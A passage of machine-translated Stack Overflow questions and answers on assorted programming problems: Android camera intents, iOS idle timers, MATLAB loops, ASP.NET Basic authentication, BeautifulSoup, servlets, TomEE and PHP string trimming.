* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-16T20:31:58.510

您所描述的是没有清单时应用程序的行为。如果你没有在你的清单或启动器活动中定义任何应用程序，Android 只会说“好的，嘿，谢谢你的 APK，我不知道该怎么处理它。” 因此您将看不到任何启动器，因为它无法启动您的应用程序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-11-30T13:16:20.540

在获取 apk 时，清单文件中可能会出现一些小错误。这些不会显示为任何错误，但可以在控制台页面中查看。请在使用apk之前检查并验证。

就我而言，清单文件中缺少元素的结束标记。但是我可以制作 apk 并成功安装在设备中。

这无法在应用列表页面中查看，但在设置页面内部搜索时，在应用列表中它是存在的。

在这种情况下，进一步重新安装也受到限制。后来我需要从设置页面手动卸载这个应用程序。

# android - 如何在 android 的 OS 4.2.2 中打开相机

> ID：15899144
> 
> 赞同：0
> 
> 时间：2013-04-09T10:10:09.743
> 
> 标签：android, camera

我使用了很多代码并且都在 4.0 上工作，但是果冻豆操作系统不支持任何代码

```
 try
                     {
        Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);

        startActivityForResult(cameraIntent, 1);        
                     }
                  catch(ActivityNotFoundException anfe){
                    //display an error message
    //                  String errorMessage = "Whoops - your device doesn't support capturing images!";
                     Toast toast= Toast.makeText(getApplicationContext(), "Whoops - your device doesn't support capturing images!", Toast.LENGTH_SHORT);  
                     toast.setGravity(Gravity.CENTER, 0, 0);
                     toast.show();

                } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:35:45.333

在您的 onCreate 或单击按钮时添加此代码

```
Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE); 
startActivityForResult(cameraIntent, CAMERA_REQUEST);

private void startActivityForResult(Intent data, int requestCode) {
    // TODO Auto-generated method stub
 if (requestCode == CAMERA_REQUEST) {  

     Bitmap photo = (Bitmap) data.getExtras().get("data"); 
     yourActivity.pictureImg.setImageBitmap(photo);
 }  

 if (requestCode == SELECT_PICTURE) {  
     Uri selectedImageUri = data.getData();
     //OI FILE Manager
     filemanagerstring = selectedImageUri.getPath();
     //MEDIA GALLERY
     selectedImagePath = getPath(selectedImageUri); 
     photo = BitmapFactory.decodeFile(selectedImagePath);
     yourActivity.pictureImg.setImageBitmap(photo);

 }  
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:16:21.597

我想你忘了在清单文件中添加权限我不知道 Os 但在 android 中它就像它

```
<uses-permission android:name="android.permission.CAMERA"/> 
```

# ios - iphone屏幕变暗时如何以编程方式打开它

> ID：15899153
> 
> 赞同：-2
> 
> 时间：2013-04-09T10:10:28.043
> 
> 标签：ios, screen

iphone锁屏前，会先调暗一段时间。我想知道当时如何在不触摸屏幕的情况下使我的应用程序中的屏幕变亮。有人可以帮忙吗？

更具体地说：我不想阻止系统睡眠，也不想调整屏幕亮度。我想要的是在屏幕变暗时收到某个事件以通知用户时使屏幕变亮。

只是以一种棘手的方式解决这个问题..

```
- (void)lightenTheScreen
{    
    [[UIApplication sharedApplication] setIdleTimerDisabled:YES];
    [[UIApplication sharedApplication] setIdleTimerDisabled:NO];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:20:50.697

这是 iPhone 的默认行为。为了防止这种性质，您可以使用以下代码。

```
[[UIApplication sharedApplication] setIdleTimerDisabled: YES]; //Add this at the end in your applicationDidFinishLaunching application 
```

来自[苹果文档](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIApplication_Class/Reference/Reference.html)

> “此属性的默认值为 NO。当大多数应用程序在短时间内没有触摸作为用户输入时，系统会将设备置于屏幕变暗的“睡眠”状态。这样做是为了节省电力。但是，除了加速度计之外没有用户输入的应用程序（例如游戏）可以通过将此属性设置为 YES 来禁用“空闲计时器”来避免系统睡眠。"

# matlab - 在 Matlab 上的循环内更改值

> ID：15899155
> 
> 赞同：0
> 
> 时间：2013-04-09T10:10:38.337
> 
> 标签：matlab, loops

我有一个问题，关于如何在每次循环中使用不同的值。我有一张有 145 个波段的图像。我计算大小、行数、列数和波段数

```
size=size(HYP);
nrow= size(1);
ncolu= size(2);
nbands= size(3); 
```

我必须对每个波段进行操作，然后获得结果，但我不知道如何为每次迭代自动更改其中一个值。我将尝试简化问题。这是我的循环。值 rad1 是之前定义的。我需要在每个循环上使用之前定义的一些值（例如，band2 值 rad2、band3 rad3 ...）并为每个值提取一个结果（nd1 自动更改为 nd2 等）

```
output= zeros(nrow,ncolu,nbands);
for banda=1:nbands;
      nd1= -((3.141592*rad1)/-HYP2(:,:,1));
output(banda,1)= (nd1);
    end
end 
```

因此，对于第一次迭代：

**nd1** = -((3.141592* **rad1** )/-HYP2(:,:, **1** )); 输出（班达，1）=（**nd1**）；

对于第二...

**nd2** = -((3.141592* **rad2** )/-HYP2(:,:, **2** )); 输出（班达，2）=（**nd2**）；

Rad1,rad 2... rad145 等是之前定义的。最后，输出将是一个 145 波段矩阵。

你知道我该怎么做吗？真的提前谢谢了

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:16:38.887

不要尝试使用不同的变量名。只需使用`rad(1)`等`rad(2)`，然后

```
output= zeros(nrow, ncolu, nbands);
for banda=1:nbands;
   output(:,:,banda) = -((3.141592*rad(banda))/-HYP2(:,:,1));
end 
```

（顺便说一下，您的初始化与`output`循环中的代码不匹配。）

# asp.net - 如何获取用户登录我网站的时间？

> ID：15899156
> 
> 赞同：-2
> 
> 时间：2013-04-09T10:10:39.857
> 
> 标签：asp.net, asp.net-mvc

如何获取用户上次登录我的网站的时间？！

我有一个登录页面 login.aspx 作为默认页面和welcome.aspx 页面，它在登录后将用户引导到welcome.aspx 页面

我想在welcome.aspx页面中显示用户登录到标签控件中的网站的时间

请帮忙 ..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:13:32.867

将登录日期和时间保存在用户会话中，如果要在另一个用户页面显示上次用户登录，则需要将这些数据保存到数据库中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:19:22.810

有几个选项（cookies、会话、数据库..）

**Cookies**：
Cookies 对您来说可能很简单。当您的用户登录时，您可以在 Login.aspx（重定向之前）中创建一个 cookie，例如：

```
HttpCookie _infoCookie = new HttpCookie("InfoCookie");
_infoCookie["LoginDate"] = DateTime.Now.ToString();
Response.Cookies.Add(_infoCookie); 
```

然后，您可以在 Welcome.aspx 阅读此 cookie

```
var loginDate = Request.Cookies["InfoCookie"]["LoginDate"]; 
```

*注意：cookies 很容易被读取，所以不要在其中保存任何敏感数据（如密码..）*

**会话**：
*也可以通过会话完成，如前所述。就是这样：*

保存到会话（在 Login.aspx 中）：

```
Session["LoginDate"] = DateTime.Now.ToString(); 
```

从会话中读取（在 Welcome.aspx 中）：

```
var loginDate = Session["LoginDate"]; 
```

请注意：会话更安全，使用起来可能更简单+您不必通知用户有关 cookie 的使用情况（在美国，有一些与将用户数据存储在 cookie 中相关的法律..您基本上必须让用户知道它。不知道详情。）

编辑：忘记将cookie实际添加到响应对象中，现在已修复:)

# python - BeautifulSoup，如何在某个标签处停止执行

> ID：15899159
> 
> 赞同：0
> 
> 时间：2013-04-09T10:10:44.560
> 
> 标签：python, python-2.7, beautifulsoup

我正在解析的 HTML：

```
<h2 class="tabellen_ueberschrift al">Cards</h2>
<table class="tabelle_grafik lh" cellpadding="2" cellspacing="1">
        <tr>
            <th class="al" colspan="3">CA Osasuna</th>              
        </tr>
                                                            <tr class="hell">
        <a href="example.com" class="fb s10" title="Sisi">Sisi</a>
        </tr>
                                                            </td></table>

<table class="tabelle_grafik lh" cellpadding="2" cellspacing="1">
        <tr>
            <th class="al" colspan="3">FC Barcelona</th>                
        </tr>
        <a href="example.com" class="fb s10" title="Busquets">Busquets</a>
        </tr>
                                                            </td></table> 
```

我正在尝试计算所有`a`标签实例，但是我需要为每个足球队单独执行此操作。所以当它遇到第二个`<table class="...">`计数器需要从 0 开始计数（我的意思是必须有两个单独的计数器）。

到目前为止，我只设法提出了可以进行计数但将其汇总在一起的代码。所以我只有一个相同的柜台。

我正在努力告诉 Python 在哪里停止并引入第二个计数器。

我没有复制我的代码，因为直到我被卡住的地步，它都非常简单。任何想法都非常欢迎！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:12:12.747

每桌计数：

```
for table in soup.find('table', class_='tabelle_grafik'):
    count = len(table.find('a')) 
```

当然，您确实需要对每个计数*做一些事情。*将它们存储在字典中、打印它们、将它们添加到列表中，等等。

将它们存储在每个俱乐部的字典示例中：

```
clubs = {}

for table in soup.find_all('table', class_='tabelle_grafik'):
    club_name = table.find('th', class_='al').text
    count = len(table.find_all('a'))
    clubs[club_name] = count 
```

# c# - 减少 C# WPF 中裁剪图像的应用程序内存

> ID：15899160
> 
> 赞同：0
> 
> 时间：2013-04-09T10:10:49.090
> 
> 标签：c#, wpf, bitmapimage, bitmapsource

我们通过从原始位图创建一个新的 CroppedImage 在我们的 WPF 应用程序中显示裁剪的图像。但是当我们查看应用程序内存时，显示裁剪图像和显示原始图像是一样的。这可能并不奇怪，因为 CroppedImage 保留了对原始位图的引用。但是，是否有可能在不引用原始位图的情况下将裁剪的图像创建为新的位图图像，并通过这样做减少应用程序内存？

一些有关如何执行此操作的代码将不胜感激。

感谢帮助！

[编辑] 这是创建裁剪图像的代码：

```
 public class TheImage : ViewModelBase
{
    public BitmapSource CroppedImage { get; private set; }

    public TheImage(byte[] imageData)
    {
        var bitmapImage = CreateBitmapSource(imageData);
        var croppingRectangle = CalculateCropRectangle(bitmapImage.PixelWidth, bitmapImage.PixelHeight);

        CroppedImage = new CroppedBitmap(bitmapImage, croppingRectangle);

    }

    private static BitmapImage CreateBitmapSource(byte[] imageData)
    {
        var bitmapImage = new BitmapImage();
        bitmapImage.BeginInit();
        bitmapImage.StreamSource = new MemoryStream(imageData);
        bitmapImage.EndInit();
        return bitmapImage;
    }

    private static Int32Rect CalculateCropRectangle(int pixelWidth, int pixelHeight)
    {
        int width = 256;
        int height = 256;

        int x = (pixelWidth - width) / 2;
        int y = (pixelHeight - height) / 2;

        return new Int32Rect(x, y, width, height);
    }
} 
```

# cocoa - 在组容器中创建文件夹

> ID：15899161
> 
> 赞同：1
> 
> 时间：2013-04-09T10:10:57.570
> 
> 标签：cocoa

我必须在组容器内创建一个文件夹。我使用了以下代码

```
NSError* error;
BOOL state = [[NSFileManager defaultManager] createDirectoryAtPath:somepath withIntermediateDirectories:YES attributes:nil error:&error]; 
```

该应用程序是一个沙盒应用程序，在执行上述代码时观察到以下错误。这个问题的解决方案是什么？

```
Error Domain=NSCocoaErrorDomain Code=513
"You don’t have permission to save the file “somepath” in the folder
“Group Containers”." UserInfo=0x21111c0
{NSFilePath=/Users/admin/Library/Containers/mypath/Data/../../../Group Containers/somepath,
NSUnderlyingError=0x21517c0 "The operation couldn’t be completed.
Operation not permitted"} 
```

（为便于阅读，手动包装了错误消息。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:07:46.947

这条路看起来有点乱。您能否更新您的问题以包括实际创建“somepath”的部分？我问的原因是因为搜索“cocoa 513”会出现[这个 SO question](https://stackoverflow.com/questions/912828/how-do-i-fix-cocoa-error-513)。

# java - 如何在android中将Base64 blob字符串转换为图像？

> ID：15899166
> 
> 赞同：2
> 
> 时间：2013-04-09T10:11:12.220
> 
> 标签：java, android, image, web, base64

我收到来自我的 Web 服务的 Base64 blob 响应。我想在我的活动中创建一个图像并将其设置为 Imageview。这是代码片段。抱歉粘贴回复。

bs64img - Base64 字符串响应代码 -

```
byte[] imageBytes=Base64.decode(bs64img, Base64.DEFAULT);
InputStream is = new ByteArrayInputStream(imageBytes);
Bitmap image=BitmapFactory.decodeStream(is);
ImageView i=(ImageView)findViewById(R.id.imageView1);
i.setImageBitmap(image); 
```

请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:18:52.220

你可以试试：

```
byte[] imgBytesData = android.util.Base64.decode(yourBase64String);
Bitmap bitmap = BitmapFactory.decodeByteArray(imgBytesData, 0, imgBytesData.length);
... then setting your ImageView or saving on FileSystem or ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:33:32.270

一般来说，嵌入的图像被给出为

```
<img src="data:image/png;base64,iVBORw0KGg..."> 
```

也就是说，给出了文件的所有字节。所以试试：

```
byte[] imageBytes=Base64.decode(bs64img, Base64.DEFAULT);
InputStream is = new ByteArrayInputStream(imageBytes);
BufferedImage img = ImageIO.read(is); 
```

# asp.net-mvc - 如何将 cshtml 文件与 durandal 一起使用 - 通用控制器方法？

> ID：15899169
> 
> 赞同：0
> 
> 时间：2013-04-09T10:11:15.703
> 
> 标签：asp.net-mvc, asp.net-mvc-4, razor, durandal

我是 Durandal 和 web MVC 的菜鸟，所以请耐心等待... :-)

我研究了这个线程：[如何在 Durandal 中使用 cshtml 文件？](https://stackoverflow.com/questions/14981833/how-can-i-use-cshtml-files-with-durandal/15636715#15636715)

我已经检查了这个答案：[https ://stackoverflow.com/a/15539354/2261129](https://stackoverflow.com/a/15539354/2261129)

但它需要一个动态控制器，每个视图都有一个动作，我正在一个有 100 多个视图的项目中工作，所以这不起作用。

我对 Maarten 的这个回答很感兴趣： [https ://stackoverflow.com/a/15636715/2261129](https://stackoverflow.com/a/15636715/2261129)

但我对如何从 Durandal 使用它有疑问？

有人可以帮我开始吗？

非常感谢您的帮助...

tak/gracias/谢谢！

○

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T15:27:05.190

我实际上更喜欢 Young 的第一个答案，尽管他更喜欢 Maarten 的。使用 Young 的回答，您可以使用 .NET MVC 路由来设置您的视图。假设我有一个家庭视图、关于视图和其他视图。我可以像这样设置路由：

```
 routes.MapRoute(
    name: "DurandalHome",
    url: "dynamic/home",
    defaults: new { controller = "RealHomeController", action = "Index" }
);
routes.MapRoute(
name: "DurandalAbout",
url: "dynamic/about",
defaults: new { controller = "RealHomeController", action = "About" }
);
routes.MapRoute(
name: "DurandalOther",
url: "dynamic/other",
defaults: new { controller = "OtherController", action = "Index" }
); 
```

显然这会很痛苦，因为您必须为 100 个视图执行此操作，但这将避免更改视图的物理位置的需要。我想同样可以使用 durandal 一侧的 viewLocator 或 viewEngine 来完成，但我不确定。

# ruby-on-rails - 动态创建路线 - rails

> ID：15899173
> 
> 赞同：0
> 
> 时间：2013-04-09T10:11:33.437
> 
> 标签：ruby-on-rails, dynamic, routes

我目前有三个级别的页面，第一级，第二级和第三级。他们每个人都有一个参考，例如：

`/firstlevel`

`/firstlevel/secondlevel`

`/firstlevel/secondlevel/thirdlevel`

每三级页面只链接到一个二级页面，每二级页面只链接到一个一级页面。但是目前，您可以输入任何第一个第二个和第三个参考，并且仍然会显示第三级页面。我需要在某个地方进行一些验证，以便只有一种方法可以进入第三级页面；通过使用正确的第一级和第二级参考。

这是我的路线文件中的内容：

```
match "/:reference" => "service#firstlevel"
match "/:reference/:reference" => "service#secondlevel"
match "/:reference/:reference/:reference" => "service#thirdlevel" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T19:44:12.347

这会给你/公司/人民/工作

```
resource :companies do
   resource :people do
     resource :jobs
   end
end 
```

在您的路线上

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T11:15:10.927

为每种方法将其添加到我的控制器中：

```
if request.fullpath == ("/#{@s.firstlevel.reference}/#{@s.reference}")

else
  render :action => "error404" 
```

可能不是最好的做事方式。

# c# - 将数据集的特定列数绑定到 Gridview

> ID：15899178
> 
> 赞同：0
> 
> 时间：2013-04-09T10:11:55.150
> 
> 标签：c#, data-binding, gridview, datasource, desktop-application

我是桌面应用程序开发的新手。

我有一个包含以下字段的数据集：

```
BillNo    |    Descirption    |  HSN Code    |   Qty    | Rate 
```

我有一个数据网格视图文本框列类型的网格视图，其中指定了以下列。

```
Sr No.    | Descirption     | HSN Code    |   Qty    | Rate    | Amount 
```

我想将“Description”、“HSN Code”、“Qty”和“Rate”绑定到数据集中的网格视图，并且我想生成“Sr No.”。&“数量”以编程方式显示网格视图。

我该怎么做呢？

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:39:32.887

在运行时创建新的 Datatable 对象并根据要求填充数据表并将其绑定到 datagrid 或 gridview

如下所示：

```
Private DataTable GetTable()
    {

    DataTable table = new DataTable();
    table.Columns.Add("Sr No.", typeof(int));
    table.Columns.Add("Descirption", typeof(string));
    table.Columns.Add("Code", typeof(string));
    .........
    ........

    retrive the data from datasourec in datatable dt

    //Here first loop through your orignal datatable or dataset

    forecch(DataRow drow in dt.Rows)
    {
        table.Rows.Add("your sr no", drow["Descirption" ],drow["Code"]);     
    }
     return table;
    } 
```

# javascript - 动画 div 的居中

> ID：15899181
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:05.367
> 
> 标签：javascript, css, animation, center

我如何为这个动作设置动画，以便稍后调用该函数时，项目将设置动画？我通常使用`$(this).animate`但不确定如何将其包装在其中，因为我正在计算它的位置。谢谢。

```
jQuery.fn.center = function ()
{
    this.css("position","absolute");
    this.css("top", Math.max(0, (($(window).height() - $(this).outerHeight()) / 2) + 
        $(window).scrollTop()) + "px");
    this.css("left", Math.max(0, (($(window).width() - $(this).outerWidth()) / 2) + 
        $(window).scrollLeft()) + "px");
    return this;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:28:43.793

要制作动画，您需要在左侧/顶部值上使用动画，但首先将位置设置为绝对使用`css()`.

```
 // can't easily animate change of css "position"
        // so we just set it directly
        elt.css('position', 'absolute');

        // animate the position
        elt.animate({
            left: x,
            top: y
        }); 
```

我为此创建了一个小提琴，在这里：http: [//jsfiddle.net/lingo/CkRUd/2/](http://jsfiddle.net/lingo/CkRUd/2/)

在小提琴中，我还整理了一些东西以确保插件更强大。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:19:24.917

而不是使用`this.css`你可以使用`this.animate`你提到的。

**例子**

```
this.animate({ 
  top : Math.max(0, (($(window).height() - $(this).outerHeight()) / 2) + 
        $(window).scrollTop()) + "px"
},800,function(){  }); 
```

### [演示](http://jsfiddle.net/mAA6U/1/)

# authentication - Web api 中的基本身份验证

> ID：15899182
> 
> 赞同：18
> 
> 时间：2013-04-09T10:12:11.613
> 
> 标签：authentication, basic-authentication, asp.net-web-api

我开始研究 Web Api，只想创建一个简单的基本身份验证。我想知道该怎么做？

我尝试使用给定的 MSDN 链接，但 MSDN 上没有提供分步教程。 [http://www.asp.net/web-api/overview/security/basic-authentication](http://www.asp.net/web-api/overview/security/basic-authentication)

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-04-23T14:32:18.957

您提供的链接提供了您需要的许多详细信息，我希望这可以填补空白。

**注意：**如果使用 Web.API 2，Microsoft 建议使用不同的方法使用[身份验证过滤器](http://www.asp.net/web-api/overview/security/authentication-filters)。

### 在您的服务器上设置 https

如果您需要真正的安全性，这非常重要，否则窥探方可以收集密码。你如何做到这一点完全取决于你的设置，你没有详细说明，但如果你正在使用 Azure WebRole，有一个非常好的[分步指南来设置](http://www.windowsazure.com/en-us/develop/net/common-tasks/enable-ssl/)来自 Microsoft 的 SSL。

这不是后续步骤所必需的，但应该在发布代码之前完成。我首先提到它是因为这部分通常涉及让其他人参与（服务器配置的系统管理员，购买证书的财务等），并且给他们很多警告是很好的。

### 编写（或窃取）自定义 IHttpModule 来进行身份验证

[这是链接中](http://www.asp.net/web-api/overview/security/basic-authentication)的一大块 C# 代码- 它解析浏览器发送的值并将 HttpContext.Current.User 设置为经过身份验证的用户。只需将肉复制并粘贴到您自己的应用程序中的一个类中，我们稍后再讨论。您需要在代码中使用以下 using 语句。

```
using System; using System.Net.Http.Headers; using System.Security.Principal;
using System.Text; using System.Threading; using System.Web; 
```

### 将该模块与您的应用程序相关联

在 web.config 文件中添加一个新模块（注意 system.webServer 可能已经存在）

```
<system.webServer>
  <modules>
    <add name="BasicAuth" type="Full.ClassName.Path.BasicAuth, Assembly.Name"/>
  </modules>
</system.webServer> 
```

### 限制对您网站相关部分的访问

您可以通过在操作定义前添加 [Authorize] 属性来阻止特定操作。通过在控制器类之前添加它来阻止整个控制器。

```
[Authorize] // Restricts access to whole controller    
public class StockController : ApiController {
    [Authorize] // Restricts access to this action - not necessary if whole controller restricted.
    public IEnumerable<StockLevel> Get() { 
```

或者在您的 App_Start\WebApiConfig.cs 文件中添加`config.Filters.Add(new AuthorizeAttribute());`，它会锁定所有内容。

需要注意的事情 - 还有一个`System.Web.Mvc.AuthorizeAttribute`所以如果你包含了那个命名空间，你可能会得到令人困惑的结果。

此时你可以试一试——user:"user", pass:"password"。

### 自定义您的用户验证

回到我们从链接中窃取的类，您将看到以下代码块：

```
// TODO: Here is where you would validate the username and password.
private static bool CheckPassword(string username, string password) 
```

如果用户名和密码有效，则更改此项以返回 true。如果你自己动手，你可能想研究[bcrypt](http://en.wikipedia.org/wiki/Bcrypt)（你相信你从网上下载的实现吗？）、[PBKDF2](http://msdn.microsoft.com/en-us/library/system.security.cryptography.rfc2898derivebytes.aspx)或[Crypto 类](http://msdn.microsoft.com/en-us/library/gg538437(v=vs.111).aspx)（简单但不是非常安全），但微软可能有更好的东西，因为有很多关于正确存储密码的担忧。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-31T19:13:15.737

我必须在 MSDN 示例中添加几行代码才能使其正常工作。具体来说，在 OnApplicationAuthenticateRequest() 中，如果无法验证用户，我将响应状态代码设置为 401：

```
private static void OnApplicationAuthenticateRequest(object sender, EventArgs e)
        {
            var request = HttpContext.Current.Request;
            var authHeader = request.Headers["Authorization"];
            bool validated = false;
            if (authHeader != null)
            {
                var authHeaderVal = AuthenticationHeaderValue.Parse(authHeader);

                // RFC 2617 sec 1.2, "scheme" name is case-insensitive
                if (authHeaderVal.Scheme.Equals("basic",
                                                StringComparison.OrdinalIgnoreCase) &&
                    authHeaderVal.Parameter != null)
                {
                    validated = AuthenticateUser(authHeaderVal.Parameter);
                }
            }

            if (!validated)
            {
                HttpContext.Current.Response.StatusCode = 401;
            }
        } 
```

一旦我这样做了，它工作得很好。可能有更好的方法来构建逻辑，但这是完成这项工作的示例的最小变化。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-25T14:21:51.803

[要在每个控制器或每个方法的基础上选择性地启用基本身份验证，您可以按照此问题](https://stackoverflow.com/q/17121964/145173)`AuthorizeAttribute`中的描述进行派生。

# java - “主”线程中的错误，NoClassDefFound：Java servlet 中的类名..如何运行类文件？

> ID：15899189
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:22.150
> 
> 标签：java, servlets, classpath

我有一个项目，我使用 start.HTML 页面来调用 javascript 调用，该调用又调用 java servlet Enquiry.java，这调用了一个 php 文件 myPhp.php。这个 php 文件从一个著名的音乐网站抓取数据，并将数据作为 XML（文件或字符串，我的选择）发送回 Enquiry.java。所以，我必须在 php 页面上有这个 xml 数据，使 myPhp.php 像一个 xml 文件，我的 servlet 使用它来从中提取数据。

现在，我必须在 putty 上编译和运行我的 java servlet 并在浏览器上运行 html 并完成剩下的工作。我能够完美地编译我的文件。我已将 CLASSPATH 设置为 ~/tomcat/jakarta/common/lib 放置所有 jar 的位置。我`>javac -classpath $CLASSPATH/servlet.jar:$CLASSPATH/json-rpc-1.0.jar Enquiry.java` 编译得很好。

现在，我必须在某个地方有一个 Enquiry.class（我认为在我的类路径中）我停止了 tomcat。将此类文件传输到我的 .java 文件所在的位置。启动tomcat。现在，我需要运行它。

我`java -classpath $CLASSPATH/servlet.jar:$CLASSPATH/json-rpc-1.0.jar Enquiry` 知道：`Error in "main" thread, NoClassDefFound : Enquiry` 我只有在当前文件夹中。我仍然得到一个异常我想知道什么是错的？

如果我添加一个 . 在查询之前，我得到：`Error in "main" thread, NoClassDefFound : javax.servlet.http.httpresponse exception`
如果我添加一个`java -cp .:$CLASSPATH...`然后我得到：`Error in "main" thread, NoClassDefFound : Main exception`

请帮我解决我的类路径并干净地运行我的 java servlet。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:23:55.283

创建 servlet 时，通常（如果不总是）将其创建为打包为`WAR`文件的 Web 应用程序的一部分。要运行您的 servlet，您需要将打包的 WAR 文件放入您正在使用的 servlet 容器的部署文件夹中。由于您显然正在使用 Tomcat，因此这可能位于`tomcat/webapps`文件夹中。[本教程](http://tomcat.apache.org/tomcat-7.0-doc/appdev/index.html)是开始学习开发和部署 Web 应用程序的好地方。您应该启动的唯一 Java 进程是您的 servlet 容器。

# jakarta-ee - 无法在 Windows 上启动 TomEE？

> ID：15899190
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:26.413
> 
> 标签：jakarta-ee, installation, ejb, openejb

这是cmd输出...

```
----------------------------------------------------------------

Installing the service 'TomEE' ...
Using CATALINA_HOME:    "C:\tomee"
Using CATALINA_BASE:    "C:\tomee"
Using JAVA_HOME:        "C:\program files\Java\jdk1.6.0_26"
Using JRE_HOME:         "C:\program files\Java\jdk1.6.0_26\jre"
Using JVM:              "C:\program files\Java\jdk1.6.0_26\jre\bin\server\jvm.dl
l"
""C:\tomee\bin\TomEE.x86.exe"" //IS//TomEE
[2013-04-09 16:16:39] [error] Unrecognized cmd option C:\tomee\bin\TomEE.x86.exe

[2013-04-09 16:16:39] [error] The specified module could not be found.
[2013-04-09 16:16:39] [error] Invalid command line arguments
[2013-04-09 16:16:39] [error] The specified module could not be found.
[2013-04-09 16:16:39] [error] Commons Daemon procrun failed with exit value: 1 (
Failed to parse command line arguments)
[2013-04-09 16:16:39] [error] The specified module could not be found.
Failed installing 'TomEE' service

------------------------------------------------------------------ 
```

我没有配置任何文件。但是 Startup.bat 可以工作并暴露 localhost:8080。但是当我试图从网页上打开 Tomee Gui 时。它没有加载。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-03-21T20:40:07.427

我刚刚将我的 TomEE v1.6.0 配置为 Windows 服务，如下所示：

1 - 以管理员身份运行 Windows CMD
2 - 转到 TomEE bin 文件夹 (${tomee}\bin)
3 - 执行以下命令：

```
service.bat install 
```

4 - 现在只需运行您的 TomEE 并对其进行测试

希望这可以帮助

# php - PHP智能修剪字符串

> ID：15899192
> 
> 赞同：1
> 
> 时间：2013-04-09T10:12:29.383
> 
> 标签：php, string

我正在尝试以非常非标准的方式修剪字符串。文本分为两部分 - 可见的预告片和隐藏的其余部分，在单击链接后由 JS 显示。我需要这样的想法：我的文字：

*预告片：* Lorem ipsum dolor sit amet，consectetur adipiscing elit。Maecenas enim est, convallis non ullamcorper hendrerit, vehicula ac quam。在malesuada suscipit eleifend。 *休息：* 在 ipsum feugiat eu ornare nunc ultricies 的 Donec posuere ipsum。Donec eleifend odio a eros semper cursus。Donec posuere ipsum 在 ipsum feugiat eu ornare nunc ultricies。Donec eleifend odio a eros semper cursus。

我的问题是因为所有文本都存储在数据库的单个字段中。需要在 dwo 点或 100 个字符后修剪预告片，然后显示文本的其余部分（不丢失任何字符）。“其余”部分必须以新句子和大字母开头，如上例所示。

如果我在文本上使用 substr ，其余的将以随机字母开头......

```
$text = '';
$text = strip_tags($row['text']);
$text = explode('.', $text);
$teaser = $text[0].$text[1].'.';
$cut = strlen($teaser);
if($cut > 100) 
{
    $teaser = trimString($text, 0, 100);
    $cut = 100;
}
$theRest = substr($row['text'], $cut); 
```

有了这个，我有以“。”结尾的预告片。或“...”（我的函数 trimString 就是这样工作的），这很好。但在这种情况下，其余部分以随机字母开头，这不是我想要的。恐怕有人会在句子中间使用点，这会导致另一个问题。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:41:18.440

```
$string = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas enim est, convallis non ullamcorper hendrerit, vehicula ac quam. In malesuada suscipit eleifend. Donec posuere ipsum at ipsum feugiat eu ornare nunc ultricies. Donec eleifend odio a eros semper cursus. Donec posuere ipsum at ipsum feugiat eu ornare nunc ultricies. Donec eleifend odio a eros semper cursus.';

$cut = strpos($string, '. ', 100)+1;
$teaser = substr($string, 0, $cut);
$rest = substr($string, $cut); 
```

* * *

解释：用于`strpos()`搜索'的第一次出现的位置。' （作为新句子的开始）。

我使用偏移量参数（100）从位置 100 开始搜索。在偏移量中添加了 +1，因此它显示了点。

所以 $new_cut 是`strpos()`使用 with计算的位置`substr()`

* * *

唯一的问题是您不能使用多个针头，我的意思是同时搜索“...”，关于 SO 的另一篇文章可能会帮助您解决此问题并将其与我的答案相结合：

[strpos() 多针？](https://stackoverflow.com/questions/6896587/strpos-with-multiple-needles)

# actionscript-3 - 文本字段失真

> ID：15899194
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:39.333
> 
> 标签：actionscript-3, flash

我有一个绘制文本字段的位图数据。缩放后，文字失真。我使用以下代码：

```
// tf is text Field and bm is bitmap.
var tf:TextField = new TextField();
tf.text = "Hello world";
var bd:BitmapData = new BitmapData(200, 200, true, 0x00ff00);
bd.draw(tf);
var bm:Bitmap = new Bitmap(bd);
addChild(bm);
bm.scaleX = 2;
bm.scaleY = 2; 
```

请指导我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:47:19.147

您应该使用变换矩阵将放大的文本字段（或任何其他矢量图形对象）绘制到 BitmapData 上。

```
var mat:Matrix=new Matrix();
mat.scale(2.0,2.0);
bd.draw(tf,mat); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:47:12.063

首先，增加字体大小，然后像这样转换和缩放为位图，

```
//---- Text format ----
var textFormat:TextFormat = new TextFormat();
textFormat.font = "Arial";
